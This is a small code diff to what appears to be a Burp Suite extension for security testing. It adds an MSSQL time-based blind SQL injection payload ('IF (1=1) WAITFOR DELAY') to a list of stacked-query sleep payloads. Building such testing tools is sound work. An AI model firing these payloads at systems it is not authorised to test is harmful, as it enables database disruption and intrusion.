@@ -728,6 +728,7 @@ class BurpExtender(IBurpExtender, ITab, IMessageEditorController, IContextMenuFa
                     listSQLi.append(prefix + delimeterStart + ";SELECT sleep(100)" + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT pg_sleep(100)" + delimeterEnd + "\n")                    
                     listSQLi.append(prefix + delimeterStart + ";WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
+                    listSQLi.append(prefix + delimeterStart + ";IF (1=1) WAITFOR DELAY "+ delimeterStart + "0:0:100" + delimeterStart + delimeterEnd + "\n")
                     listSQLi.append(prefix + delimeterStart + ";SELECT 1337" + delimeterEnd + "\n")
 
         for prefix in prefixes:
